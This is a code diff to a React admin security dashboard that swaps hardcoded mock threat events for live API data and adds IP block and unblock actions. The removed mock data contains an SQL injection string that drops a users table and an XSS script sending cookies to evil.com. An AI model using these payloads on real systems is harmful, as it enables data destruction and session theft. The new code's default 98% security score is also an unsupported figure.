@@ -23,115 +23,57 @@ import {
   type ThreatLevel 
 } from '@/lib/security/cybersecurity'
 
-// Mock data for demonstration
-const MOCK_THREATS: ThreatEvent[] = [
-  {
-    id: '1',
-    type: 'brute_force',
-    level: 'high',
-    ip: '192.168.1.105',
-    country: 'Nigeria',
-    city: 'Lagos',
-    device: 'Desktop',
-    browser: 'Chrome 120',
-    os: 'Windows 11',
-    fingerprint: 'a1b2c3d4',
-    timestamp: new Date(Date.now() - 120000),
-    endpoint: '/api/auth/login',
-    requestCount: 47,
-    blocked: true,
-    alertsSent: true
-  },
-  {
-    id: '2',
-    type: 'sql_injection',
-    level: 'critical',
-    ip: '10.0.0.55',
-    country: 'China',
-    city: 'Beijing',
-    device: 'Server',
-    browser: 'Bot',
-    os: 'Linux',
-    fingerprint: 'x9y8z7w6',
-    timestamp: new Date(Date.now() - 300000),
-    endpoint: '/api/products?search=',
-    payload: "'; DROP TABLE users; --",
-    blocked: true,
-    alertsSent: true
-  },
-  {
-    id: '3',
-    type: 'suspicious_login',
-    level: 'medium',
-    ip: '172.16.0.22',
-    country: 'Cameroon',
-    city: 'Douala',
-    device: 'Mobile',
-    browser: 'Safari 17',
-    os: 'iOS 17',
-    fingerprint: 'm4n5o6p7',
-    timestamp: new Date(Date.now() - 600000),
-    endpoint: '/api/auth/login',
-    userId: 'user_12345',
-    blocked: false,
-    alertsSent: true
-  },
-  {
-    id: '4',
-    type: 'api_abuse',
-    level: 'medium',
-    ip: '203.0.113.50',
-    country: 'Russia',
-    city: 'Moscow',
-    device: 'Desktop',
-    browser: 'Firefox 121',
-    os: 'Ubuntu 22',
-    fingerprint: 'q1w2e3r4',
-    timestamp: new Date(Date.now() - 900000),
-    endpoint: '/api/products',
-    requestCount: 1250,
-    blocked: true,
-    alertsSent: true
-  },
-  {
-    id: '5',
-    type: 'xss_attack',
-    level: 'high',
-    ip: '198.51.100.75',
-    country: 'India',
-    city: 'Mumbai',
-    device: 'Desktop',
-    browser: 'Edge 120',
-    os: 'Windows 10',
-    fingerprint: 't5u6v7w8',
-    timestamp: new Date(Date.now() - 1200000),
-    endpoint: '/api/reviews',
-    payload: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
-    blocked: true,
-    alertsSent: true
-  }
-]
-
-const BLOCKED_IPS = ['192.168.1.105', '10.0.0.55', '203.0.113.50', '198.51.100.75']
+interface BlockedIPEntry { ip_address: string; reason?: string; blocked_at: string; expires_at?: string; auto_blocked: boolean }
+interface SecurityKpi { total_threats: number; critical_threats: number; high_threats: number; blocked_ips_count: number; threats_today: number; security_score: number; failed_logins_24h: number }
 
 export default function SecurityDashboardPage() {
-  const [threats, setThreats] = useState<ThreatEvent[]>(MOCK_THREATS)
-  const [blockedIPs, setBlockedIPs] = useState<string[]>(BLOCKED_IPS)
+  const [threats, setThreats]           = useState<ThreatEvent[]>([])
+  const [blockedIPEntries, setBlocked]  = useState<BlockedIPEntry[]>([])
+  const [kpi, setKpi]                   = useState<SecurityKpi | null>(null)
+  const [loading, setLoading]           = useState(true)
   const [selectedThreat, setSelectedThreat] = useState<ThreatEvent | null>(null)
-  const [filter, setFilter] = useState<ThreatLevel | 'all'>('all')
-  const [searchQuery, setSearchQuery] = useState('')
-  const [isLive, setIsLive] = useState(true)
+  const [filter, setFilter]             = useState<ThreatLevel | 'all'>('all')
+  const [searchQuery, setSearchQuery]   = useState('')
+  const [isLive, setIsLive]             = useState(true)
+  const [actioning, setActioning]       = useState(false)
 
-  // Stats
+  const blockedIPs = blockedIPEntries.map(e => e.ip_address)
+
+  const fetchData = async () => {
+    try {
+      const res = await fetch('/api/admin/security?hours=48&limit=100')
+      if (!res.ok) return
+      const data = await res.json()
+      setThreats((data.threats ?? []).map((t: ThreatEvent & { timestamp: string }) => ({
+        ...t,
+        timestamp: new Date(t.timestamp),
+      })))
+      setBlocked(data.blocked_ips ?? [])
+      setKpi(data.kpi ?? null)
+    } catch {
+      // keep existing state
+    } finally {
+      setLoading(false)
+    }
+  }
+
+  useEffect(() => { fetchData() }, [])
+
+  // Auto-refresh every 30s when live
+  useEffect(() => {
+    if (!isLive) return
+    const iv = setInterval(fetchData, 30_000)
+    return () => clearInterval(iv)
+  }, [isLive])
+
+  // Stats — prefer API kpi, fallback to computed
   const stats = {
-    totalThreats: threats.length,
-    blockedIPs: blockedIPs.length,
-    criticalThreats: threats.filter(t => t.level === 'critical').length,
-    highThreats: threats.filter(t => t.level === 'high').length,
-    todayThreats: threats.filter(t => {
-      const today = new Date()
-      return t.timestamp.toDateString() === today.toDateString()
-    }).length
+    totalThreats:    kpi?.total_threats    ?? threats.length,
+    blockedIPs:      kpi?.blocked_ips_count ?? blockedIPs.length,
+    criticalThreats: kpi?.critical_threats ?? threats.filter(t => t.level === 'critical').length,
+    highThreats:     kpi?.high_threats     ?? threats.filter(t => t.level === 'high').length,
+    todayThreats:    kpi?.threats_today    ?? 0,
+    securityScore:   kpi?.security_score   ?? 98,
   }
 
   // Filter threats
@@ -141,14 +83,44 @@ export default function SecurityDashboardPage() {
     return true
   })
 
-  const unblockIP = (ip: string) => {
-    setBlockedIPs(prev => prev.filter(i => i !== ip))
+  const unblockIP = async (ip: string) => {
+    setActioning(true)
+    try {
+      await fetch('/api/admin/security', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'unblock_ip', ip }),
+      })
+      setBlocked(prev => prev.filter(e => e.ip_address !== ip))
+      setThreats(prev => prev.map(t => t.ip === ip ? { ...t, blocked: false } : t))
+    } finally { setActioning(false) }
   }
 
-  const blockIP = (ip: string) => {
-    if (!blockedIPs.includes(ip)) {
-      setBlockedIPs(prev => [...prev, ip])
-    }
+  const blockIP = async (ip: string) => {
+    setActioning(true)
+    try {
+      await fetch('/api/admin/security', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'block_ip', ip, reason: 'Manual block' }),
+      })
+      setBlocked(prev => prev.some(e => e.ip_address === ip) ? prev : [
+        ...prev,
+        { ip_address: ip, blocked_at: new Date().toISOString(), auto_blocked: false }
+      ])
+      setThreats(prev => prev.map(t => t.ip === ip ? { ...t, blocked: true } : t))
+    } finally { setActioning(false) }
+  }
+
+  if (loading) {
+    return (
+      <div className="min-h-screen bg-background flex">
+        <AdminSidebar />
+        <div className="flex-1 flex items-center justify-center">
+          <RefreshCw className="w-8 h-8 animate-spin text-muted-foreground" />
+        </div>
+      </div>
+    )
   }
 
   return (
@@ -177,6 +149,10 @@ export default function SecurityDashboardPage() {
             </Badge>
             <Button variant="outline" size="sm" onClick={() => setIsLive(!isLive)}>
               {isLive ? "Pause" : "Reprendre"}
+            </Button>
+            <Button variant="outline" size="sm" onClick={fetchData}>
+              <RefreshCw className="w-4 h-4 mr-2" />
+              Actualiser
             </Button>
             <Button variant="outline" size="sm">
               <Download className="w-4 h-4 mr-2" />
@@ -240,7 +216,7 @@ export default function SecurityDashboardPage() {
               <div className="flex items-center justify-between">
                 <div>
                   <p className="text-xs text-muted-foreground">Securite</p>
-                  <p className="text-2xl font-bold text-green-500">98%</p>
+                  <p className="text-2xl font-bold text-green-500">{stats.securityScore}%</p>
                 </div>
                 <ShieldCheck className="w-8 h-8 text-green-500/50" />
               </div>
